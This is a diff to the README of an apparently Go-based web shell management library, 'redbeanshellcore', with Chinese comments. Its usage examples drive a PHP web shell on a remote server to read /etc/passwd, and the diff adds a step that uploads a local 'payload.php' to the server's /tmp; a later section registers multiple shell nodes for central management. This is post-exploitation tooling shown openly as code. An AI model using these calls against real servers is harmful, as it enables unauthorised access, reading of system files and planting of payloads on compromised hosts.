@@ -18,10 +18,12 @@ package main
 import (
     "context"
     "fmt"
+    "os"
     "time"
 
     "github.com/Yliken/redbeanshellcore/core"
     phpshell "github.com/Yliken/redbeanshellcore/adapter/php"
+    "github.com/Yliken/redbeanshellcore/registry/memory"
     "github.com/Yliken/redbeanshellcore/transport/httpform"
 )
 
@@ -80,12 +82,18 @@ for _, e := range flr.Entries {
 res, _ := client.Do(ctx, phpshell.NewPhpFileRead("/etc/passwd"))
 frr := res.(*core.FileReadResult)
 fmt.Println(string(frr.Data))
+
+// 上传文件
+data, _ := os.ReadFile("./local-payload.php")
+res, _ = client.Do(ctx, phpshell.NewPhpFileUpload("/tmp/payload.php", data))
+up := res.(*core.BoolResult)
+fmt.Println(up.OK) // true 表示成功
 ```
 
 ## 5. 多节点管理
 
 ```go
-mgr := core.NewManager(memory.New(), phpadapter.NewClientFactory())
+mgr := core.NewManager(memory.New(), phpshell.NewClientFactory())
 
 // 注册节点
 mgr.Register(ctx, core.NodeConfig{
